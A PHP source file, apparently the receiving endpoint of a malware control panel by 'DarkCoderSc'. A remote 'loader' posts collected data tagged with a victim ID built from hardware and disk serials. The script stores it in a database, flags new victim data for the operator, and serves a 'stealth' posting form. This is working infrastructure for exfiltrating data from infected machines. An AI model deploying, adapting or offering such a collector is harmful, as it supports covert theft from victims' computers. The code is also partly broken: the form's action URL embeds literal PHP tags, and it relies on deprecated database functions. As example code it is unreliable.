<?php 
	/**
		This is were the loader will post his stuff
		By DarkCoderSc
	*/
	
	include('inc/connection.inc.php');
	
	/**
		Check if all is there
	*/
	if(isset($_POST['typ']) && isset($_POST['data'])){
		$sock = getDBSock(); // get new socket
		
		$uid = mysql_real_escape_string($_GET['uid']);												// Get unic identifier HWID + Main HD Serial
		$type = htmlspecialchars(mysql_real_escape_string($_POST['typ'])); 		// Type of data
		$data = htmlspecialchars(mysql_real_escape_string($_POST['data'])); 	// The data content
		$time = time();																												// The current server time
		
		/**
			First inserting data to our table
		*/
		$sql = "INSERT INTO vn_userdata VALUES('','$uid','$type','$time','$data')";					 
		mysql_query($sql, $sock) or die(mysql_error()) ;
		
		/**
			Then update status to new data in database for notification
		*/
		$sql = "UPDATE vn_users SET nfdata=1 WHERE uid='$uid'";
		mysql_query($sql, $sock); // Update consulting status
		
		mysql_close($sock); // close our socket connection
	}
	
	/**
		Our stealth formular
	*/
	if(isset($_GET['uid'])){
		$uid = htmlspecialchars($_GET['uid']); // Securesied against XSS
		echo "<form action=\"poster.php?uid=<?php echo $uid; ?>\" method=\"POST\">";
			echo "<input type=\"text\" name=\"typ\"></input>";
			echo "<textarea name=\"data\">";
			echo "</textarea>";
			echo "<input type=\"submit\"></input>";
		echo "</form>";
	}
	
?>